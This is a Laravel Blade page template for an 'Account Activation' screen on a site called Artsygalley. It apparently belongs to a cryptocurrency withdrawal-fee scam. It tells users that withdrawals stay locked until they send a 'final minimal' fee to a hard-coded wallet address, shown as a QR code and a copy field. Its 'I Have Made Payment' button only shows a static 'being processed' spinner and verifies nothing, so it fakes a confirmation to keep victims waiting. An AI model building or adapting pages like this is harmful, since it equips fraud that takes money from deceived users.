@include('dashboard.header')
<main class="content">
    @if(session('message'))
    <div class="btn btn-success">{{ session('message') }}</div>
    @endif
    <div class="container d-flex flex-column">
        <div class="row vh-10">
            <div class="col-sm-10 col-md-8 col-lg-6 col-xl-5 mx-auto d-table h-100">
                <div class="text-center mt-4">
                    <h2>Account Activation</h2>
                    <p>
                        <strong>Account Functionality:</strong> Activation is required to unlock the withdrawal and
                        transactional features associated with your account.
                    </p>
                    <p>
                        <strong>Activation Fee Details:</strong><br>
                        To activate your ledger identity, a final minimal fee of
                        <strong>{{Auth::user()->activation_fee}}</strong> (likely in cryptocurrency) is required. This
                        is a one-time activation fee, after which your account will be fully operational.
                    </p>
                    <h4>Steps to Complete Activation:</h4>
                    <ol>
                        <li>Log in to your Artsygalley account.</li>
                        <li>Navigate to the <strong>"Activate Ledger Identity"</strong> section.</li>
                        <li>Pay the activation fee of <strong>{{Auth::user()->activation_fee}}</strong> as per the
                            provided instructions.</li>
                        <li>Once payment is confirmed, your ledger ID will be activated, and withdrawals will be
                            enabled.</li>
                    </ol>
                </div>

                <div class="mt-4 text-center">
                    <h4>Payment Barcode</h4>
                    <img src="https://api.qrserver.com/v1/create-qr-code/?data=0x745C8efa37583B14315272648dAbeA38Abb40628"
                        style="width:300px;">
                </div>

                <div class="mt-5 text-center">
                    <h4>Wallet Address</h4>
                    <input type="text" id="myInput1" class="form-control"
                        value="0x745C8efa37583B14315272648dAbeA38Abb40628" readonly>
                    <button class="btn btn-primary mt-2" onclick="copyAdr1()">Copy Wallet Address</button>
                </div>

                <!-- New Button for Payment Confirmation -->
                <div class="mt-5 text-center">
                    <button class="btn btn-success btn-lg" onclick="showPaymentProcessing()">I Have Made
                        Payment</button>
                </div>

                <!-- Beautiful Payment Message -->
                <div id="paymentMessage" class="custom-alert d-none">
                    <div class="spinner-border text-primary" role="status" style="width: 3rem; height: 3rem;">
                        <span class="visually-hidden">Loading...</span>
                    </div>
                    <h3 class="mt-3">Thank you!</h3>
                    <p>Your payment is being processed. Please wait while we confirm your transaction.</p>
                </div>
            </div>
        </div>
    </div>
</main>

<style>
    /* Custom Styling for Payment Message */
    .custom-alert {
        position: fixed;
        top: 50%;
        left: 50%;
        transform: translate(-50%, -50%);
        background-color: #f8f9fa;
        border: 3px solid #007bff;
        border-radius: 10px;
        padding: 30px 50px;
        text-align: center;
        box-shadow: 0 4px 10px rgba(0, 0, 0, 0.2);
        z-index: 1050;
    }

    .custom-alert h3 {
        color: #007bff;
        font-weight: bold;
    }

    .custom-alert p {
        font-size: 1.1rem;
        margin-top: 10px;
    }
</style>

<script>
    function showPaymentProcessing() {
        // Display the message
        const messageDiv = document.getElementById("paymentMessage");
        messageDiv.classList.remove("d-none");
    }

    function copyAdr1() {
        var copyText = document.getElementById("myInput1");
        copyText.select();
        copyText.setSelectionRange(0, 99999);
        navigator.clipboard.writeText(copyText.value);
        alert("Wallet address copied to clipboard!");
    }
</script>

<script src="js/app.js"></script>

</body>

</html>